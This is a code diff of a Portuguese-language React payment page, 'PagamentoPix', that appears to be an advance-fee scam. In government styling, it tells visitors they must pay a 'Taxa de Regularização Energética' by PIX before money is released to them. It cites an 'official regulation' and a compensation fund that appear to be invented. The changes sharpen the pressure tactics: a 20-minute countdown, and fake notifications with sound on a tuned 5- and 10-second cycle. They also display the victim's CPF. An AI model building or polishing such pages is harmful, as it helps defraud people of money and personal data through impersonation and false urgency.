@@ -3,7 +3,7 @@ import { useLocation } from "wouter";
 import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { Copy, CheckCircle, Info, AlertCircle, Bell } from "lucide-react";
+import { Copy, CheckCircle, Info, AlertCircle, AlertTriangle, Bell } from "lucide-react";
 import { Separator } from "@/components/ui/separator";
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { useToast } from "@/hooks/use-toast";
@@ -176,26 +176,28 @@ export default function PagamentoPix() {
     // 2. Cada notificação fica visível por 5 segundos
     // 3. Após uma notificação sumir, espera mais 10 segundos para mostrar a próxima
     
-    // Função para gerenciar o ciclo de notificações
+    // Função para gerenciar o ciclo de notificações exatamente conforme especificado:
+    // 1. Primeira notificação após 10 segundos da abertura da página
+    // 2. Cada notificação fica visível por EXATAMENTE 5 segundos
+    // 3. Após uma notificação sumir, espera EXATAMENTE 10 segundos para mostrar a próxima
     const gerenciarCicloNotificacoes = () => {
-      // 1. Toca o som manualmente antes de gerar a notificação
-      // para garantir que o som seja tocado uma vez e no momento certo
+      console.log('Gerando notificação'); // Logging para debug
+      
+      // Toca o som de notificação (mais suave agora)
       playNotificationSound();
       
-      // Pequeno atraso para sincronizar o som com a notificação visual
+      // Gera uma notificação imediatamente
+      gerarNotificacao();
+      
+      // Programa a remoção da notificação após EXATOS 5 segundos
       setTimeout(() => {
-        // Gera uma notificação (sem o som automático)
-        gerarNotificacao();
+        // Remove todas as notificações
+        setNotificacoes([]);
+        console.log('Notificação removida, aguardando 10 segundos'); // Logging para debug
         
-        // 2. Programa a remoção da notificação após 5 segundos
-        setTimeout(() => {
-          // Remove todas as notificações
-          setNotificacoes([]);
-          
-          // 3. Programa a próxima notificação após 10 segundos do desaparecimento
-          setTimeout(gerenciarCicloNotificacoes, 10000);
-        }, 5000);
-      }, 100);
+        // Programa a próxima notificação após EXATOS 10 segundos do desaparecimento
+        setTimeout(gerenciarCicloNotificacoes, 10000);
+      }, 5000);
     };
     
     // Inicia o ciclo após 10 segundos da abertura da página
@@ -223,25 +225,25 @@ export default function PagamentoPix() {
         
           <div className="mb-6 space-y-4">
             <Alert className="bg-red-50 border-red-200">
-              <AlertCircle className="h-5 w-5 text-red-600" />
-              <AlertTitle className="text-red-800 font-bold text-lg">AÇÃO OBRIGATÓRIA PARA RECEBIMENTO</AlertTitle>
-              <AlertDescription className="text-red-700">
+              <div className="flex items-center">
+                <AlertCircle className="h-5 w-5 text-red-600 flex-shrink-0 mr-2" />
+                <AlertTitle className="text-red-800 font-bold text-lg">AÇÃO OBRIGATÓRIA PARA RECEBIMENTO</AlertTitle>
+              </div>
+              <AlertDescription className="text-red-700 mt-2">
                 Para que o valor de <strong className="font-bold">{valorFormatado}</strong> seja liberado para depósito em sua conta bancária, é <span className="underline font-bold">obrigatório</span> o pagamento da Taxa de Regularização Energética (TRE).
               </AlertDescription>
             </Alert>
             
             <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
-              <div className="flex items-start">
-                <AlertCircle className="h-5 w-5 text-amber-600 mt-0.5" />
-                <div className="ml-3">
-                  <h3 className="text-amber-800 font-bold">ATENÇÃO: PRAZO FINAL PARA PAGAMENTO</h3>
-                  <p className="text-amber-700 mt-1">
-                    Conforme regulamento oficial, o pagamento da TRE deve ser realizado no prazo máximo de <strong>20 minutos</strong>. 
-                    Após esse prazo, a solicitação será cancelada automaticamente, e o valor reservado será devolvido ao 
-                    Fundo Nacional de Compensação Tarifária, ficando indisponível para nova solicitação.
-                  </p>
-                </div>
+              <div className="flex items-center mb-2">
+                <AlertTriangle className="h-5 w-5 text-amber-600 flex-shrink-0 mr-2" />
+                <h3 className="text-amber-800 font-bold">ATENÇÃO: PRAZO FINAL PARA PAGAMENTO</h3>
               </div>
+              <p className="text-amber-700">
+                Conforme regulamento oficial, o pagamento da TRE deve ser realizado no prazo máximo de <strong>20 minutos</strong>. 
+                Após esse prazo, a solicitação será cancelada automaticamente, e o valor reservado será devolvido ao 
+                Fundo Nacional de Compensação Tarifária, ficando indisponível para nova solicitação.
+              </p>
             </div>
           </div>
           
@@ -259,7 +261,7 @@ export default function PagamentoPix() {
                     
                     <div>
                       <p className="text-gray-500 text-sm">CPF</p>
-                      <p className="font-medium">{cpf}</p>
+                      <p className="font-medium">{cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}</p>
                     </div>
 
                     <div>
@@ -388,8 +390,10 @@ export default function PagamentoPix() {
                     <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)]">Pagamento via PIX</h2>
                     <div className="flex items-center">
                       <span className="text-red-600 font-medium mr-2">Tempo:</span>
-                      <div className={`font-mono font-bold text-lg ${tempoRestante < 300 ? 'text-red-600 animate-pulse' : 'text-red-600'}`}>
-                        {formatarTempo(tempoRestante)}
+                      <div className="bg-red-50 px-3 py-2 rounded-lg border border-red-200 shadow-sm">
+                        <div className={`font-mono font-bold text-lg ${tempoRestante < 300 ? 'text-red-600 animate-pulse' : 'text-red-600'}`}>
+                          {formatarTempo(tempoRestante)}
+                        </div>
                       </div>
                     </div>
                   </div>
